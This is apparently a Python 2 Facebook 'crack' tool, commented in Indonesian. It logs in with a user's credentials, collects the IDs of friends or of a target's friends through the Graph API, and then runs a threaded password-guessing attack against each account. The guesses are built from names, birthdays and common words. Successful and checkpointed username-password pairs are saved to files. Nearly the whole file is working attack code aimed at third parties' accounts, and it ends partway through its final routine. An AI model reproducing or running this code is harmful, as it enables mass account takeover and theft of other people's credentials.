#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 vip.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
logo = """ \033[96m        .:'
    __ :'__
 .'`__`-'__``. • Facebook : Fb.com/Rizky.Rasata
:__________.-' • Github   : Github.com/RKT1/vip
:_________:    • Recode   : Muhammad Rizky
 :_________`-; • Whatsapp : 0895xxxxxxxxx
  `.__.-.__.'
\033[0m-----------------------------------------"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0m[\033[93m●\033[0m]\033[93m Sedang masuk\033[0m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []


def masuk():
	os.system('clear')
	print logo
	print "\033[92m1. \033[0mLogin via email/id fb"
	print "\033[92m2. \033[0mLogin via token fb (No Sesi)"
	print "\033[92m3. \033[0mAmbil Token"
	print "\033[91m0. \033[0mKeluar"
	print
	msuk = raw_input("\033[93m︻デ═一▸ \033[91m:\033[92m ")
	if msuk =="":
		print"\033[0m[\033[91m!\033[0m]\033[0m Isi Yg Benar !"
		masuk()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="3":
		Ambil_Token()
	elif msuk =="0":
		keluar()
	else:
		print"\033[0m[\033[91m!\033[0m]\033[0m Isi Yg Benar !"
		time.sleep(0.7)
		masuk()

######## TOKENZ ########
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[0m[\033[95m?\033[0m] Token : ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print "[\033[92m✓\033[0m] \033[92mLogin Berhasil "
		os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
		time.sleep(1)
		menu()
	except KeyError:
		print "[!] Token salah !"
		time.sleep(1.7)
		masuk()

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print "\033[0m[\033[96m×\033[0m] LOGIN AKUN FACEBOOK ANDA \033[0m[\033[96m×\033[0m]"
		id = raw_input('[\033[95m+\033[0m] ID/Email =\033[92m ')
		pwd = getpass.getpass('\033[0m[\033[95m?\033[0m] Password =\033[92m')
		tik()
		try:
			br.open('https://mbasic.facebook.com')
		except mechanize.URLError:
			print"\n[!] Tidak ada koneksi"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[0m[\033[92m✓\033[0m]\033[92m Login Berhasil'
				os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n[!] Tidak ada koneksi"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[0m[\033[93m!\033[0m]\033[92m Sepertinya akun anda kena checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[0m[\033[91m!\033[0m]\033[91m Password/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
		if 'login' in url:
			print("\n\033[0m[\033[91m!\033[0m]\033[91m Password/Email salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			masuk()
			
			

def Ambil_Token():
	os.system("clear")
	print logo
	jalan("Install...")
	os.system (" npm install ")
	jalan ("Mulai...")
	os.system (" npm start ")
	raw_input("\n[ Kembali ]")
	masuk()



			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[92m『"+nama+"』"
	print "\033[0m-----------------------------------------"
	print "\033[92m1.\033[0m Crack id Indonesia "
	print "\033[92m2.\033[0m Crack id bangladesh "
	print "\033[92m3.\033[0m Crack id usa "
	print "\033[92m4.\033[0m Crack id search name \033[92m(Fast) "
	print "\033[91m0.\033[0m Logout            \n"
	pilih()
	
	
def pilih():
	unikers = raw_input("︻デ═一▸ : ")
	if unikers =="":
		print "[!] Isi yang benar"
		pilih()
	elif unikers =="1":
		indo()
	elif unikers =="2":
		bangla()
	elif unikers =="3":
		Usa()
	elif unikers =="4":
		cari()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "[!] Isi yang benar"
		pilih()
		
def bangla():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[92m1. \033[0mCrack dari daftar teman"
	print "\033[92m2. \033[0mCrack dari id publik/teman"
	print "\033[91m0. \033[0mKembali"
	pilih_bangla()

def pilih_bangla():
	peak = raw_input("\n︻デ═一▸ : ")
	if peak =="":
		print "[!] Isi yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[0m{\033[92m+\033[0m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0m{\033[92m✓\033[0m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID publik tidak ditemukan!"
			raw_input("\n[ Kembali ]")
			bangla()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
			
	elif peak =="0":
		menu()
	else:
		print "[!] Isi yang benar"
		pilih_bangla()
	
	
	print "\033[0m{\033[92m+\033[0m} Total ID : "+str(len(id))
	print('\033[0m{\033[92m?\033[0m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0m{\033[92m•\033[0m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n-----------------------------------------")
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['last_name'] + '12345'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[92m[OK✓] ' + user + ' • ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[93m[CP+] ' + user + ' • ' + pass1
					cek = open("banglad.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[92m[OK✓] ' + user + ' • ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[93m[CP+] ' + user + ' • ' + pass2
							cek = open("banglad.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[92m[OK✓] ' + user + ' • ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[93m[CP+] ' + user + ' • ' + pass3
									cek = open("banglad.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = ('786786')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[92m[OK✓] ' + user + ' • ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[93m[CP+] ' + user + ' • ' + pass4
											cek = open("banglad.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[92m[OK✓] ' + user + ' • ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[93m[CP+] ' + user + ' • ' + pass5
													cek = open("banglad.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[92m[OK✓] ' + user + ' • ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[93m[CP+] ' + user + ' • ' + pass6
															cek = open("banglad.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['last_name'] + '1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[92m[OK✓] ' + user + ' • ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[93m[CP+] ' + user + ' • ' + pass7
																	cek = open("banglad.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = ('Bangladesh')
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[92m[OK✓] ' + user + ' • ' + pass8
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[93m[CP+] ' + user + ' • ' + pass8
																			cek = open("banglad.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
																			
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print '\n\033[0m[\033[92m✓\033[0m] Selesai ...'
	print"\033[0m[\033[95m+\033[0m] Total \033[92mOK\033[0m/\033[93mCP\033[0m :\033[92m "+str(len(oks))+"\033[0m/\033[93m"+str(len(cekpoint))
	print("\033[0m[\033[93m+\033[0m] File tersimpan : banglad.txt")
	raw_input("\n\033[96m[\033[0m Kembali \033[96m]")
	os.system('python2 vip.py')
	
	##########INDONESIA#######
	
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[93m1. \033[0mCrack dari daftar teman"
	print "\033[93m2. \033[0mCrack dari id publik/teman"
	print "\033[91m0. \033[0mKembali"
	pilih_indo()

def pilih_indo():
	peak = raw_input("\n︻デ═一▸ : ")
	if peak =="":
		print "[!] Isi yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[0m{\033[93m+\033[0m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0m{\033[93m✓\033[0m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID publik tidak ditemukan!"
			raw_input("\n[ Kembali ]")
			indo()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
			
	elif peak =="0":
		menu()
	else:
		print "[!] Isi yang benar"
		pilih_indo()
	
	
	print "\033[0m{\033[93m+\033[0m} Total ID : "+str(len(id))
	print('\033[0m{\033[93m?\033[0m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0m{\033[93m•\033[0m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n-----------------------------------------")
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[92m[OK✓] ' + user + ' • ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[91m[CP+] ' + user + ' • ' + pass1
					cek = open("indo.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[92m[OK✓] ' + user + ' • ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[91m[CP+] ' + user + ' • ' + pass2
							cek = open("indo.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[92m[OK✓] ' + user + ' • ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[91m[CP+] ' + user + ' • ' + pass3
									cek = open("indo.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'Sayang'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[92m[OK✓] ' + user + ' • ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[91m[CP+] ' + user + ' • ' + pass4
											cek = open("indo.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Anjing'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[92m[OK✓] ' + user + ' • ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[91m[CP+] ' + user + ' • ' + pass5
													cek = open("indo.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[92m[OK✓] ' + user + ' • ' + pas6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[91m[CP+] ' + user + ' • ' + pass6
															cek = open("indo.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Kontol'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[92m[OK✓] ' + user + ' • ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[91m[CP+] ' + user + ' • ' + pass7
																	cek = open("indo.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = 'Bangsat'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\x1b[92m[OK✓] ' + user + ' • ' + pass8
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[91m[Cekpoint] ' + user + ' • ' + pass8
																			cek = open("indo.txt", "a")
																			cek.write(user+"|"+pass8+"\n")
																			cek.close()
																			cekpoint.append(user+pass8)
														
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print '\033[0m[\033[92m✓\033[0m] Selesai ...'
	print"\033[0m[\033[95m+\033[0m] Total \033[92mOK\033[0m/\033[91mCP\033[0m :\033[92m "+str(len(oks))+"\033[0m/\033[91m"+str(len(cekpoint))
	print("\033[0m[\033[93m+\033[0m] File tersimpan : indo.txt")
	raw_input("\n\033[96m[\033[0m Kembali \033[96m]")
	os.system('python2 vip.py')


###################################################### 



 ############ USA #########
def Usa():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[94m1. \033[0mCrack dari daftar teman"
	print "\033[94m2. \033[0mCrack dari id publik/teman"
	print "\033[91m0. \033[0mKembali"
	super_Usa()

def super_Usa():
	peak = raw_input("\n︻デ═一▸ : ")
	if peak =="":
		print "[!] Isi yang benar"
		Usa()
	elif peak =="1":
		os.system('clear')
		print logo
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[0m{\033[94m+\033[0m} ID publik/teman : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[0m{\033[94m✓\033[0m} Nama : "+op["name"]
		except KeyError:
			print"[!] ID publik tidak ditemukan!"
			raw_input("\n[ Kembali ]")
			Usa()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
			
	elif peak =="0":
		menu()
	else:
		print "[!] Isi yang benar"
		pilih_super()
	
	
	print "\033[0m{\033[94m+\033[0m} Total ID : "+str(len(id))
	print('\033[0m{\033[94m?\033[0m} Stop CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0m{\033[94m•\033[0m} Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print ("\n-----------------------------------------")
	
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[96m[\x1b[94mCekpoint\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass1
					cek = open("out/usa.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					lahir = b['birthday']
					pass2 = lahir.replace('/', '')
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[96m[\x1b[94mCekpoint\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass2
							cek = open("out/usa.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[94m[\x1b[94mCekpoint\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass3
									cek = open("out/usa.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[94m[Cekpoint] ' + user + ' | ' + pass4
											cek = open("out/usa.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = b['last_name'] + '123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[94m[Cekpoint] ' + user + ' | ' + pass5
													cek = open("out/usa.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = ('Indiana')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[96m[\x1b[92mBerhasil\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[96m[\x1b[91mCekpoint\x1b[96m]\x1b[97m ' + user + ' \x1b[96m|\x1b[97m ' + pass6
															cek = open("out/banglo.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														
